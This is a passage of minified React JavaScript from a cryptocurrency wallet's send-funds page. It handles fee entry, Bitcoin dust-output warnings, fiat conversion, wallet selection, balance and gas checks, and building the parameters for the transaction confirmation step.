                    let {target: t} = e;
                    return n(t.value.trim())
                }
            }), null === a && O.createElement("div", {
                className: rD
            }, O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("span", {
                className: nD
            }, "Default fee: ", O.createElement("b", {
                onClick: handleSetDefault
            }, t), " ", (0,
            be.xG)(r && r.currency)))
        }
        ;
        InputFeeValue.propTypes = {
            onChange: as().func,
            defaultValue: as().string,
            value: as().string,
            feeWallet: as().object
        };
        const cD = InputFeeValue;
        function usePrecision(e) {
            var t;
            const {currency: a} = e || {}
              , n = e && e.data ? e.data.precision : null
              , {precision: r=6} = null !== (t = (0,
            be.II)(a)) && void 0 !== t ? t : {}
              , l = undefined;
            return [n || r]
        }
        const uD = a.p + "3b612405dc76d5930fb8c7762a880f9c.svg"
          , dD = a.p + "08fc94e2e2a9fbaedec6310c0988cb01.svg"
          , mD = a.p + "a48d39703498414f14ac55b6f0121a3c.svg"
          , pD = undefined
          , use_useInternetConnection = () => {
            const [e,t] = (0,
            O.useState)(navigator.onLine)
              , setOnline = () => {
                t(!0)
            }
              , setOffline = () => {
                t(!1)
            }
            ;
            (0,
            O.useEffect)(( () => {
                window.addEventListener("offline", setOffline);
                window.addEventListener("online", setOnline);
                return () => {
                    window.removeEventListener("offline", setOffline);
                    window.removeEventListener("online", setOnline)
                }
            }
            ), []);
            return [e]
        }
          , useCheckBtcUtxo = e => {
            let {fromWallet: t, addressTo: a, amount: n, feePerByte: r, fee: l} = e;
            const [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                if (!(t && a && r && l))
                    return;
                const e = new AbortController
                  , s = e.signal;
                (async () => {
                    if ("checkUtxos"in t) {
                        const {isNoValid: e, isDustRemaining: o} = await (null == t ? void 0 : t.checkUtxos({
                            addressTo: a,
                            amount: null != n ? n : "0",
                            fee: `${l}`,
                            feePerByte: `${r}`
                        }));
                        if (!s.aborted) {
                            i(o);
                            c(e)
                        }
                    } else {
                        i(!1);
                        c(!1)
                    }
                }
                )();
                return () => e.abort()
            }
            ), [t, a, n, l, r]);
            return (0,
            O.useMemo)(( () => ({
                isBtcDustUtxoWarning: s,
                isBtcNoValidUtxoWarning: o
            })), [s, o])
        }
          , DustUtxoRemaining = () => O.createElement(ui_message, {
            type: "error"
        }, "After the transaction has been executed, there will be unusable outputs. To avoid this you can either replenish the wallet balance, or pick satoshi per byte, or send the full balance to your own wallet. :", " ", O.createElement("a", {
            href: "https://support.guarda.com/troubleshooting/dust-error-what-is-it",
            target: "_blank",
            rel: "noreferrer noopener"
        }, "Check how does it work ", O.createElement(VA, {
            src: uD,
            alt: "Open Link"
        })))
          , NoValidUtxo = () => O.createElement(ui_message, {
            type: "error"
        }, "The transaction cannot be executed because there is not enough usable outputs. To avoid this you can replenish the wallet balance or wait for the previous transaction to be validated on the blockchain.")
          , fD = "convert-amount_wrapper_1K_O7"
          , ConvertAmount = e => {
            let {fromWallet: t, toCurrency: a, amount: n} = e;
            const {convertToFiat: r, convertToCrypto: l, isAvailableRate: s} = useConverter()
              , {localCurrency: i} = local_currency_useLocalCurrency()
              , o = undefined
              , c = undefined
              , getRenderedTicker = () => t && t.currency === a ? (0,
            be.xG)(i) : t ? (0,
            be.xG)(t.currency) : a || i.toUpperCase();
            if (!!!t || (e => Number.isNaN(1 * e))(n) || !n)
                return O.createElement("div", {
                    className: fD
                }, "0 ", getRenderedTicker());
            if (!s(t))
                return null;
            if (t.currency === a) {
                const e = r(n, t);
                return O.createElement("div", {
                    className: fD
                }, O.createElement(fiat_estimate_FiatEstimate, {
                    value: e
                }), " ", getRenderedTicker())
            }
            return O.createElement("div", {
                className: fD
            }, l(n, t, a), " ", getRenderedTicker())
        }
        ;
        ConvertAmount.propTypes = {
            fromWallet: as().object,
            toCurrency: as().string,
            amount: as().oneOfType([as().string, as().number])
        };
        const ED = ConvertAmount
          , hD = "convert-dropdown_wrapper_5Rku2"
          , gD = "convert-dropdown_inlineButton_1LZ4s"
          , yD = "convert-dropdown_listFiatCurrencies_2ukuB"
          , vD = "convert-dropdown_isActive__3LHB"
          , _D = "convert-dropdown_iconArrow_3Yqm6"
          , wD = "convert-dropdown_fiatType_FM8NV"
          , bD = O.forwardRef(( (e, t) => {
            const {insertFiatList: a, handleChange: n, selected: r} = e
              , enterHandler = e => {
                n(e.dataset.fiatTicker)()
            }
              , {arrowNavigation: l, listRef: s} = es({
                enterHandler
            });
            return O.createElement(O.Fragment, null, O.createElement("input", {
                autoFocus: !0,
                onKeyDown: l,
                style: {
                    opacity: 0,
                    position: "fixed"
                },
                ref: t
            }), O.createElement("ul", {
                onKeyDown: l,
                ref: s,
                className: yD
            }, [a].concat(lT.W).map((e => O.createElement("li", {
                key: `fiat-send-${e.ticker}`,
                onClick: n(e.ticker),
                "data-fiat-ticker": e.ticker,
                className: Ht()({
                    [vD]: (0,
                    Ho.t)(r) === (0,
                    Ho.t)(e.ticker)
                })
            }, O.createElement("span", null, (0,
            be.xG)(e.ticker)), " ", e.title ? `- ${e.title}` : null)))))
        }
        ));
        bD.propTypes = {
            selected: as().string,
            handleChange: as().func,
            insertFiatList: as().object
        };
        const kD = bD
          , ConvertDropdown = e => {
            let {selected: t, wallet: a, onChange: n} = e;
            const [r,l] = (0,
            O.useState)(!1);
            (0,
            Cd.Y)(a, [t].filter(Sd.isFiat));
            const handleChange = e => () => {
                n((e || "").toLowerCase());
                l(!1)
            }
              , s = {
                ticker: a.currency,
                isFiat: !1
            };
            return O.createElement("div", {
                className: hD
            }, O.createElement("div", {
                onClick: () => l(!r),
                className: gD
            }, (0,
            be.xG)(t || a.currency), O.createElement("img", {
                src: VT,
                alt: "",
                className: _D
            })), O.createElement(Xl(), {
                visible: r,
                onClose: () => l(!1)
            }, O.createElement(kD, {
                handleChange,
                insertFiatList: s,
                selected: t
            })))
        }
        ;
        ConvertDropdown.propTypes = {
            wallet: as().object,
            selected: as().string,
            onChange: as().func
        };
        const SD = ConvertDropdown
          , CD = "index_wrapper_1XNki app_wrapperBlock_2EpA3"
          , ND = "index_wrapperForm_2jcHv app_wrapperLeftBlock_3QLZp"
          , TD = "index_rightMessage_jUJT2"
          , AD = "index_footerBlock_1tWo0 app_footerBlock_n86Kc"
          , xD = "index_stepInfo_hdfF2 app_stepInfo_2VLE6"
          , ID = "index_wrapperQrScanner_L8Ss2"
          , PD = "index_toggleAdvancedOptions_zboK2"
          , LD = "index_addTagLink_1Yu7j"
          , FD = "index_recognizeAddressBlock_pQgex"
          , WD = "index_recognizeAddressLoader_1x_FU"
          , RD = "index_external_1EE0m"
          , BD = "index_checkboxText_m7P0x"
          , OD = "index_gethInfo_295y1"
          , DD = "index_sliderTitle_35pH0"
          , MD = "index_userSelect_1Fc2E"
          , UD = "index_addressTo_y7nQj"
          , GD = "index_inputAmount_1eD0k"
          , use_wallets_from = e => {
            const t = undefined;
            return [...(0,
            $.v9)($c)].filter((e => !("eos" === e.currency && !e.accountName))).filter((e => {
                var t;
                return null === (t = Se.Z.getRootMetadata(e.currency)) || void 0 === t ? void 0 : t.coin.features.isActiveSend
            }
            )).filter((t => !e || t.currency === e)).filter((e => !e.isWatchOnly))
        }
          , use_wallets_to = e => {
            const t = (0,
            $.v9)($c)
              , a = (0,
            $.v9)(lu);
            return [...t].filter((e => {
                var t;
                return null === (t = Se.Z.getRootMetadata(e.currency)) || void 0 === t ? void 0 : t.coin.features.isActiveSend
            }
            )).filter((t => {
                if (!e)
                    return !1;
                if ("neo" === e.family && "neo" !== e.currency && e.address === t.address)
                    return !1;
                const n = a(e.uuid);
                return (null == n ? void 0 : n.currency) === t.currency && void 0 !== (null == n ? void 0 : n.currency) || ("trx" !== t.currency || t.address !== e.address) && ("ada-shelley" === t.currency && "ada" === e.currency || "ada" === t.currency && "ada-shelley" === e.currency || (e.uuid !== t.uuid || "eos" !== t.currency) && (e && e.currency === t.currency && e.family === t.family))
            }
            ))
        }
          , use_initial_params = () => {
            const e = useLocationSearch()
              , t = (0,
            $.I0)()
              , a = (0,
            $.v9)(selectedCache)
              , n = (0,
            $.v9)(eu)
              , r = (0,
            $.v9)($c)
              , [l,s] = (0,
            O.useState)(!1)
              , i = e.currencyTo && e.addressTo && !e.walletTo && !e.walletFrom
              , o = e.walletFrom || e.walletTo
              , [c,u] = (0,
            O.useState)(null)
              , [d,m] = (0,
            O.useState)(null)
              , p = e.originalAmount || e.amount
              , [f,E] = (0,
            O.useState)(p || "")
              , h = !!i
              , setFromWallet = e => {
                t(setCacheKey("sendFromWallet", e ? e.uuid : ""));
                u(null != e ? e : null)
            }
              , setToWallet = e => {
                t(setCacheKey("sendToWallet", e ? e.uuid : ""));
                m(null != e ? e : null)
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (c) {
                    const e = n(c.uuid);
                    e && e.balance !== c.balance && u(e)
                }
                if (d) {
                    const e = n(d.uuid);
                    e && e.balance !== d.balance && m(e)
                }
            }
            ), [r]);
            (0,
            O.useEffect)(( () => {
                let c, d;
                if (!l && r.length) {
                    if (!o && !i) {
                        c = n(a.sendFromWallet);
                        d = n(a.sendToWallet);
                        d && c && d.currency !== c.currency && (d = null);
                        if (!c && !d) {
                            const e = r.find((e => "btc" === e.currency && !e.isWatchOnly));
                            e && u(e)
                        }
                        s(!0)
                    }
                    if (i) {
                        const t = !!e.family && !!e.currencyTo && e.family !== e.currencyTo;
                        let a = null;
                        if (t) {
                            const t = undefined;
                            r.filter((t => t.currency === e.family && !t.isWatchOnly)).forEach((t => {
                                if (t.subWallets && t.subWallets.length) {
                                    const n = t.subWallets.find((t => t.currency === e.currencyTo));
                                    !a && n && (a = n)
                                }
                            }
                            ))
                        } else {
                            var m;
                            a = null !== (m = r.find((t => t.currency === e.currencyTo && !t.isWatchOnly))) && void 0 !== m ? m : null
                        }
                        if (a) {
                            u(a);
                            s(!0)
                        }
                    }
                    if (o) {
                        var p, f, E, h, g;
                        c = n(e.walletFrom);
                        d = n(e.walletTo);
                        if ((null === (p = c) || void 0 === p ? void 0 : p.family) === (null === (f = d) || void 0 === f ? void 0 : f.family) && void 0 === (null === (E = d) || void 0 === E ? void 0 : E.family)) {
                            var y, v;
                            (null === (y = c) || void 0 === y ? void 0 : y.currency) !== (null === (v = d) || void 0 === v ? void 0 : v.currency) && (d = null)
                        }
                        (null === (h = c) || void 0 === h ? void 0 : h.family) !== (null === (g = d) || void 0 === g ? void 0 : g.family) && (d = null);
                        s(!0)
                    }
                    c && u(c);
                    c && t(updateWalletsBalanceAndTxs(c, {
                        isCascade: !0
                    }));
                    d && t(updateWalletsBalanceAndTxs(d, {
                        isCascade: !0
                    }))
                }
            }
            ), [r]);
            (0,
            O.useEffect)(( () => {
                if (r.length && l) {
                    const t = n(e.walletFrom);
                    if (t && t.uuid !== (c && c.uuid)) {
                        u(t);
                        m(null)
                    }
                }
            }
            ), [null == r ? void 0 : r.length, e]);
            return [c, setFromWallet, d, setToWallet, f, E, h]
        }
        ;
        var VD = a(74863)
          , KD = a.n(VD);
        class ValidatorLoader {
            async getValidatorByWallet(e, t) {
                const a = !!e.family
                  , n = a ? e.family : e.currency;
                return KD().create({
                    ticker: n,
                    adapter: await Se.Z.loadFullAdapter({
                        ticker: n,
                        tokens: a
                    }, {
                        currency: e.currency,
                        precision: e.precision,
                        smartContract: e.smartContract
                    }),
                    ...t
                })
            }
        }
        const HD = new ValidatorLoader
          , useAdapterValidator = e => {
            let {fromWallet: t, gasPrice: a, gasLimit: n, extraId: r=""} = e;
            const [l,s] = (0,
            O.useState)()
              , [i,o] = (0,
            O.useState)({});
            (0,
            O.useEffect)((function updateAdapterValidator() {
                const e = new AbortController
                  , {signal: a} = e;
                async function updateValidator() {
                    if (!t)
                        return;
                    const e = await HD.getValidatorByWallet(t, {
                        additionalFields: {
                            extraId: r
                        }
                    });
                    a.aborted || s(e)
                }
                updateValidator();
                return () => {
                    e.abort()
                }
            }
            ), [t, null == t ? void 0 : t.address, r]);
            (0,
            O.useEffect)((function updateAdapterValidatorErrors() {
                const e = undefined
                  , t = ((null == l ? void 0 : l.validate([{
                    field: "gasPrice",
                    value: a
                }, {
                    field: "gasLimit",
                    value: n
                }, {
                    field: "extraId",
                    value: r
                }])) || []).reduce(( (e, t) => t.isValid ? e : {
                    ...e,
                    [t.field]: t
                }), {});
                o(t)
            }
            ), [l, a, n, r]);
            return {
                adapterValidator: l,
                adapterValidatorErrors: i
            }
        }
          , isLunaWithZeroBalance = e => ("luna" === e.currency && void 0 === e.family || "luna" === e.family) && ("0" === e.balance || "" === e.balance);
        let zD;
        !function(e) {
            e.minus = "minus";
            e.plus = "plus"
        }(zD || (zD = {}));
        const useMinimalBalanceCheck = e => {
            const {wallet: t, estimate: a, operationType: n} = e
              , [r,l] = (0,
            O.useState)("0")
              , [s,i] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)((function onSetRequiredBalanceWarning() {
                async function start() {
                    i(!1);
                    if (n === zD.minus && "sol" !== (null == t ? void 0 : t.currency) && "near" !== (null == t ? void 0 : t.currency))
                        return;
                    const e = await Se.Z.getApiByCurrency(null == t ? void 0 : t.currency);
                    if (!e || !e.getMinimalBalance)
                        return;
                    const r = await e.getMinimalBalance({
                        address: null == t ? void 0 : t.address
                    });
                    if ("0" === r)
                        return;
                    let s;
                    s = n === zD.minus ? (0,
                    Ko.lt)((0,
                    Ko.h9)(null == t ? void 0 : t.balance, (0,
                    Ko.yF)(a)), r) : (0,
                    Ko.lt)((0,
                    Ko.PD)(null == t ? void 0 : t.balance, (0,
                    Ko.yF)(a)), r);
                    l(r);
                    i(s)
                }
                t && start()
            }
            ), [a, n, t]);
            return (0,
            O.useMemo)(( () => ({
                isWarning: s,
                minimalBalance: r
            })), [s, r])
        }
          , jD = "send-to-address"
          , $D = "send-to-wallet"
          , ZD = {
            dot: 1,
            near: .02,
            ksm: 333334e-10
        };
        function BoardSendPage() {
            var e, t, a, n, r, l;
            const s = useLocationSearch()
              , i = (0,
            j.k6)()
              , o = (0,
            $.I0)()
              , c = O.createRef()
              , u = (0,
            $.v9)($c)
              , d = (0,
            $.v9)(selectedCache)
              , m = (0,
            $.v9)(tu)
              , p = (0,
            $.v9)(eu)
              , {convertToFiat: f, convertToCrypto: E, isAvailableRate: h} = useConverter()
              , [g,y] = (0,
            O.useState)(s.addressToTitle || s.addressTo || "")
              , [v,_] = (0,
            O.useState)(!(null == s || !s.extraId) || !1)
              , [w,b] = (0,
            O.useState)(d.isVisibleOptions)
              , [k,S] = (0,
            O.useState)(s.extraId || "")
              , [C,N] = (0,
            O.useState)(s.convertTo || void 0)
              , [T,A] = (0,
            O.useState)(s.gasPrice || "")
              , [x,I] = (0,
            O.useState)(s.gasLimit || "")
              , [P,L] = (0,
            O.useState)(Number(null !== (e = s.feePerByte) && void 0 !== e ? e : "NaN") || null)
              , [F,W] = (0,
            O.useState)(s.manualFee || null)
              , [R,B] = (0,
            O.useState)(s.nonce || "")
              , [D,U] = (0,
            O.useState)("0")
              , [G,V] = (0,
            O.useState)("0")
              , [K,H] = (0,
            O.useState)("0")
              , [z,Z] = (0,
            O.useState)(!1)
              , [Y,q] = (0,
            O.useState)(!1)
              , [X,Q] = (0,
            O.useState)(!1)
              , [J,ee] = (0,
            O.useState)(!1)
              , [te,ae] = (0,
            O.useState)(!1)
              , [ne,re] = (0,
            O.useState)(!1)
              , [le,se] = (0,
            O.useState)(!1)
              , [ie,oe] = (0,
            O.useState)("0")
              , [ce,ue] = (0,
            O.useState)(!1)
              , [de,me] = (0,
            O.useState)(!0)
              , [pe,fe] = (0,
            O.useState)(null)
              , {localCurrency: Ee} = local_currency_useLocalCurrency()
              , [he,ge] = (0,
            O.useState)(!1)
              , [ye] = use_useInternetConnection()
              , [ve,_e] = (0,
            O.useState)(null)
              , [we,ke] = (0,
            O.useState)(s.addressToTitle ? s.addressTo : null)
              , [Ce,Ne] = (0,
            O.useState)(!1)
              , [Te,xe,Ie,Pe,Le,Fe,We] = use_initial_params()
              , Re = use_wallets_from(s.family)
              , Be = use_wallets_to(null != Te ? Te : void 0)
              , {minimalBalance: Oe} = useMinimalBalanceCheck({
                wallet: Te,
                estimate: s.amount,
                operationType: zD.minus
            });
            (0,
            O.useEffect)(( () => {
                if (s.walletFrom) {
                    const e = p(s.walletFrom);
                    if (e && !Te) {
                        xe(e);
                        o(setActiveWallet(e));
                        return
                    }
                }
                if (!m || m.isWatchOnly)
                    Re.length ? xe(Re[0]) : xe(void 0);
                else {
                    xe(m);
                    Pe(void 0)
                }
            }
            ), [s, null == m ? void 0 : m.uuid]);
            const [De,Me] = (0,
            O.useState)(( () => !We && d.sendType ? d.sendType : s.walletTo ? $D : jD))
              , Ue = {
                uuid: "dummy_send_convert_to_wallet",
                address: g,
                currency: null !== (t = null == Te ? void 0 : Te.currency) && void 0 !== t ? t : s.currencyTo
            }
              , Ge = De === $D ? Ie : Ue
              , toBaseAmountCurrency = e => Te && C !== Te.currency ? E(e, Te, null != C ? C : void 0) : e;
            (0,
            O.useEffect)((function setWalletToFromParams() {
                if (s.walletTo) {
                    const e = p(s.walletTo);
                    if (e && Ie !== e) {
                        Pe(e);
                        return
                    }
                }
            }
            ), [s, p, Pe]);
            (0,
            O.useEffect)(( () => {
                Le && Te && s.currencyTo && Te.currency.toLowerCase() !== s.currencyTo.toLowerCase() && Fe("")
            }
            ), [s.currencyTo, Te]);
            const Ve = (0,
            O.useCallback)(( () => {
                const e = !w;
                b(e);
                o(setCacheKey("isVisibleOptions", e))
            }
            ), [o, w])
              , Ke = (0,
            O.useCallback)(( () => {
                const e = De === $D ? jD : $D;
                Me(e);
                o(setCacheKey("sendType", e))
            }
            ), [o, De])
              , He = (0,
            O.useCallback)((e => Pe(e)), [Pe])
              , ze = (0,
            O.useCallback)((e => {
                e.currency === (null == Te ? void 0 : Te.currency) && e.family === (null == Te ? void 0 : Te.family) || Pe(void 0);
                o(updateWalletsBalanceAndTxs(e, {
                    isCascade: !0
                }));
                o(setActiveWallet(e));
                xe(e)
            }
            ), [o, null == Te ? void 0 : Te.currency, null == Te ? void 0 : Te.family, xe, Pe])
              , je = (0,
            O.useCallback)((e => y(e)), [])
              , $e = (0,
            O.useCallback)((e => ee(e)), [])
              , Ze = (0,
            O.useCallback)((e => ae(e)), [])
              , Ye = (0,
            O.useCallback)((e => re(e)), [])
              , qe = (0,
            O.useCallback)((e => Ne(e)), [])
              , Xe = (0,
            O.useCallback)((e => {
                if (e.error) {
                    ke(null);
                    _e(e.error);
                    ee(!1)
                } else if (void 0 !== e.address) {
                    _e(null);
                    ke(e.address);
                    ee(!0)
                } else
                    ke(null)
            }
            ), [])
              , Qe = (0,
            O.useCallback)(( () => {
                const e = Te && "eos" === Te.currency ? "To Account" : "To Address";
                return De === $D ? e : "To My Wallet"
            }
            ), [Te, De])
              , Je = (0,
            O.useCallback)((e => !s.family || !s.currencyTo || s.family !== s.currencyTo || e.data && e.data.currency === s.family), [s]);
            (0,
            O.useEffect)((function setInitialConvertCurrency() {
                Te && s.currencyTo && Te.currency !== s.currencyTo && N(Te.currency);
                Te && s.currencyTo && !s.convertTo && N(Te.currency);
                Te && !s.currencyTo && N(Te.currency)
            }
            ), [Te, s.convertTo, s.currencyTo]);
            const [et,tt] = (0,
            O.useState)();
            (0,
            O.useEffect)(( () => {
                Te && Se.Z.getApiByWallet(Te).then((e => tt(e)))
            }
            ), [Te]);
            const [at] = fee_wallet(null != Te ? Te : void 0);
            (0,
            O.useEffect)(( () => {
                if (!Te)
                    return;
                async function fetchAdvancedOptions() {
                    var e, t;
                    if (!Te)
                        return;
                    const a = !(null == Te || !Te.multisigId)
                      , n = await Se.Z.getApiByWallet(Te);
                    if (!le)
                        if (Te && a)
                            try {
                                const e = undefined
                                  , t = we && !ve ? we : g
                                  , a = (null == Ie ? void 0 : Ie.address) || t
                                  , r = Te.participants.map((e => e.data))
                                  , l = u.filter((e => r.includes(e.address)))[0]
                                  , s = await n.estimateMultisigApproveGasLimit(Te.address, l.address, a, Le || "0");
                                I(s)
                            } catch {}
                        else if (n.getGasLimit && !s.gasLimit) {
                            const e = {
                                addressFrom: Te.address,
                                privateKey: Te.privateKey,
                                amount: Le || "1",
                                addressTo: (null == Ie ? void 0 : Ie.address) || g || Te.address,
                                extraId: k
                            }
                              , t = await n.getGasLimit(e);
                            I(t)
                        }
                    if (n.getGasPrice && !s.gasPrice && !T) {
                        const e = await n.getGasPrice();
                        A(e)
                    }
                    if (n.getDefaultFeePerKb && !s.feePerByte && !P) {
                        const e = await n.getDefaultFeePerKb();
                        L(e)
                    }
                    if (n.getMinimalFee) {
                        const e = await n.getMinimalFee();
                        oe(e)
                    } else
                        oe("0");
                    U(n.getMinimalAmount ? n.getMinimalAmount() : "0");
                    const r = Te ? await (null === (e = Te.getAvailableBalance) || void 0 === e ? void 0 : e.call(Te)) || Te.balance : "0"
                      , l = at ? await (null === (t = at.getAvailableBalance) || void 0 === t ? void 0 : t.call(at)) || at.balance : "0";
                    V(r);
                    H(l)
                }
                const e = window.setTimeout(fetchAdvancedOptions, 1200);
                return () => window.clearTimeout(e)
            }
            ), [Te, null == Te ? void 0 : Te.address, Ie, null == Ie ? void 0 : Ie.address, g, Le, s.gasLimit, s.gasPrice, s.feePerByte, le, T, P, we, ve, u, k]);
            (0,
            O.useEffect)((function resetVisibleErrors() {
                Z(!1);
                Q(!1)
            }
            ), [Te, Ie, Le, g]);
            (0,
            O.useEffect)((function setFeeVisibility() {
                Te && "btc" === Te.currency ? me(Boolean(Le && "0" !== Le)) : me(!0)
            }
            ), [Le, Te]);
            (0,
            O.useEffect)((function checkAndSetWalletToBalance() {
                async function checkBalance() {
                    if (Te && De === jD) {
                        let e = null;
                        e = Se.Z.hasLightAdapterByWallet(Te) ? await Se.Z.loadLightAdapterByWallet(Te) : await Se.Z.getApiByWallet(Te);
                        const t = await e.getBalanceByAddress({
                            address: g,
                            currency: null == Te ? void 0 : Te.currency
                        })
                          , a = (0,
                        Ae.k)(t).balance;
                        fe(a)
                    } else
                        fe(Ie ? Ie.balance : "0")
                }
                if (Ie && ZD[Ie.currency] || g && Te && ZD[Te.currency]) {
                    fe("0");
                    checkBalance()
                }
            }
            ), [Le, Ie, g, Te, De]);
            (0,
            O.useEffect)(( () => {
                Ze("neo" === (null == Te ? void 0 : Te.family) && "neo" !== (null == Te ? void 0 : Te.currency) && g === (null == Te ? void 0 : Te.address))
            }
            ), [g, Te, Ze]);
            const nt = Te ? G : "0"
              , rt = Te ? D : "0"
              , toSendAmountCurrency = e => Te ? f(e, Te, null != C ? C : void 0) : e
              , [st] = usePrecision(null != Te ? Te : void 0)
              , [it] = usePrecision(null != at ? at : void 0)
              , ot = toSendAmountCurrency((0,
            Ko.h9)(nt, Oe))
              , ct = (0,
            Ko.gW)(ot || "0", "0")
              , ut = toSendAmountCurrency(rt)
              , dt = (0,
            O.useCallback)((e => {
                let {target: {value: t}} = e;
                se(!0);
                I(t)
            }
            ), [])
              , mt = (0,
            O.useCallback)((e => {
                let {target: {value: t}} = e;
                return B(t)
            }
            ), [])
              , pt = (0,
            O.useCallback)((e => A(e)), [])
              , [ft] = default_fee_per_byte(Te)
              , Et = P || ft || void 0
              , [ht,,,,yt,vt] = use_fee(null != Te ? Te : void 0, null != Ge ? Ge : void 0, toBaseAmountCurrency(Le), {
                gasPrice: T,
                gasLimit: x,
                feePerByte: Et,
                totalBalance: Te ? Te.balance : void 0,
                privateKey: Te ? Te.privateKey : void 0,
                extraId: k
            }, "send")
              , _t = F || ht
              , wt = (0,
            O.useCallback)((e => {
                W(e === ht ? null : e)
            }
            ), [ht]);
            (0,
            O.useEffect)(( () => {
                if (ht && null === F && at && Le && "0" !== Le) {
                    const e = f(ht, at, "usd");
                    ue((0,
                    Ko.gt)(e, 1))
                } else
                    ue(!1)
            }
            ), [ht, F, at, Le, f]);
            const bt = Te && (0,
            be.II)(Te.currency)
              , kt = at && (0,
            be.II)(at.currency)
              , St = Te ? null === (a = Se.Z.getMetadataByWallet(Te)) || void 0 === a ? void 0 : a.features : void 0
              , {isVisibleGasLimitBlock: Ct, isVisibleNonceBlock: Nt, isCanChangeFeeRate: Tt, isCanChangeFeeValue: At} = null != St ? St : {}
              , xt = Ct || Tt || At
              , It = bt && bt.extraId || kt && kt.extraId
              , Pt = bt && bt.extraId ? bt : kt
              , Lt = It && Pt && Pt.extraId ? Pt.extraId.title : ""
              , Ft = (0,
            $.v9)((e => {
                var t;
                return Oc(e, (null == Te || null === (t = Te.data) || void 0 === t ? void 0 : t.uuid) || "")
            }
            ));
            (0,
            O.useEffect)((function fetchTrxResourcesOnUpdate() {
                var e;
                o(td({
                    address: (null == Te ? void 0 : Te.address) || "",
                    walletId: (null == Te || null === (e = Te.data) || void 0 === e ? void 0 : e.uuid) || ""
                }))
            }
            ), [null == Te ? void 0 : Te.address, null == Te || null === (n = Te.data) || void 0 === n ? void 0 : n.uuid, o]);
            const Wt = null == Ft ? void 0 : Ft.resources
              , Rt = !vt && !Number.isNaN(_t) && at && (0,
            Ko.gt)(null != yt && yt.extraFee && _t ? (0,
            Ko.PD)(_t, null == yt ? void 0 : yt.extraFee) : _t, K)
              , Bt = Te && "dot" === Te.currency
              , Ot = (0,
            O.useMemo)(( () => null != Te && Te.balance ? (0,
            Ko.h9)(Te.balance, _t) : "0"), [_t, null == Te ? void 0 : Te.balance])
              , Dt = Le && !vt && Te && Wt && "trx" === Te.family && "trx" !== Te.currency
              , Mt = Bt && (0,
            Ko.lt)(Ot, "1")
              , Ut = Bt && (0,
            Ko.lt)((0,
            Ko.h9)(Ot, Le), "1")
              , Gt = Bt && (0,
            Ko.eq)((0,
            Ko.h9)(null == Te ? void 0 : Te.balance, Le), "0") && (0,
            Ko.eg)((0,
            Ko.h9)(Le, _t), 1)
              , Vt = (0,
            O.useMemo)(( () => Ie && ZD[Ie.currency]), [Ie])
              , Kt = (0,
            O.useMemo)(( () => Vt && (0,
            Ko.eq)(pe, 0) && (0,
            Ko.lt)(Le, Vt)), [Le, Vt, pe])
              , Ht = (0,
            O.useMemo)(( () => Te ? Te.currency === C ? Le : E(Le, Te, C) : "0"), [Le])
              , {isBtcNoValidUtxoWarning: zt, isBtcDustUtxoWarning: jt} = useCheckBtcUtxo({
                addressTo: null !== (r = null == Ie ? void 0 : Ie.address) && void 0 !== r ? r : g,
                fee: _t,
                amount: Ht,
                fromWallet: Te,
                feePerByte: P
            })
              , $t = (0,
            O.useMemo)(( () => jt && X), [jt, X])
              , Zt = (0,
            O.useMemo)(( () => zt && X), [zt, X])
              , {adapterValidator: Yt, adapterValidatorErrors: qt} = useAdapterValidator({
                fromWallet: Te,
                gasLimit: x,
                gasPrice: T,
                extraId: k
            })
              , handleNext = () => {
                var e, t;
                if (Mt || Kt)
                    return;
                if (Rt) {
                    Z(!0);
                    return
                }
                if (ne) {
                    q(!0);
                    return
                }
                const {isValid: a} = null !== (e = null === (t = c.current) || void 0 === t ? void 0 : t.validate()) && void 0 !== e ? e : {};
                if (!a || Object.keys(qt).length) {
                    Z(!0);
                    return
                }
                if (jt || zt) {
                    Q(!0);
                    return
                }
                const n = (0,
                Ko.y4)(toBaseAmountCurrency(Le))
                  , r = {
                    walletFrom: (null == Te ? void 0 : Te.uuid) || "",
                    amount: (0,
                    Ko.FH)((0,
                    Ko.LT)(n, nt), {
                        max: st
                    }),
                    originalAmount: Le,
                    convertTo: C || ""
                };
                vt && Object.assign(r, {
                    resource: vt
                });
                De === $D && Object.assign(r, {
                    walletTo: null == Ie ? void 0 : Ie.uuid
                });
                const l = we && !ve
                  , s = l ? we : g;
                De === jD && Object.assign(r, {
                    addressTo: null == s ? void 0 : s.trim(),
                    currencyTo: null == Te ? void 0 : Te.currency
                });
                l && Object.assign(r, {
                    addressToTitle: g
                });
                Ct && Object.assign(r, {
                    gasLimit: x,
                    gasPrice: T
                });
                Tt && Object.assign(r, {
                    feePerByte: P
                });
                At && F && Object.assign(r, {
                    manualFee: F
                });
                R && Object.assign(r, {
                    nonce: R
                });
                k && Object.assign(r, {
                    extraId: k
                });
                const o = (0,
                Ko.FH)(f(Le, null != Te ? Te : void 0, "usd"), {
                    max: 4
                });
                o && Object.assign(r, {
                    amountInUsd: o
                });
                const u = toHashUrlParams(r)
                  , d = new URLSearchParams({
                    ...r,
                    urlid: u
                });
                i.push({
                    pathname: (0,
                    M.RU)("/send/confirm"),
                    search: d.toString()
                })
            }
              , handleGoTronStaking = () => {
                i.push({
                    pathname: (0,
                    M.RU)("/staking-trx"),
                    search: objectToString({
                        walletFrom: null == at ? void 0 : at.uuid
                    })
                })
            }
            ;
            function onFilterWallets(e) {
                return !!e && ((null == Te ? void 0 : Te.currency) === e.currency || void 0 === e.ticker)
            }
            const Xt = (null == Te ? void 0 : Te.uuid) !== (null == at ? void 0 : at.uuid)
              , Qt = {
                precision: st >= 0 ? st : null,
                min: (0,
                Ko.FH)(ut, {
                    max: st
                }),
                max: (0,
                Ko.FH)(ct, {
                    max: st
                }),
                available: (0,
                Ko.y4)(ct)
            }
              , Jt = {
                precision: it,
                min: 0,
                max: null
            }
              , ea = {
                precision: 1,
                min: 0,
                max: null,
                isInt: !0
            }
              , ta = {
                precision: 1,
                min: 21e3,
                max: null
            }
              , aa = {
                fromWallet: Te,
                balance: pe,
                available: (0,
                Ko.y4)(ct),
                fee: _t
            }
              , na = {
                fromWalletCurrency: null == Te ? void 0 : Te.currency.toLowerCase()
            };
            function handleChangeAmount(e) {
                const t = e.replace(/[^0-9.,]/g, "")
                  , a = (0,
                Ko.y4)(t);
                Fe(a)
            }
            function handleChangeAmountFromMax(e) {
                const t = (0,
                Ko.y4)(e);
                Fe((0,
                Ko.FH)(t, {
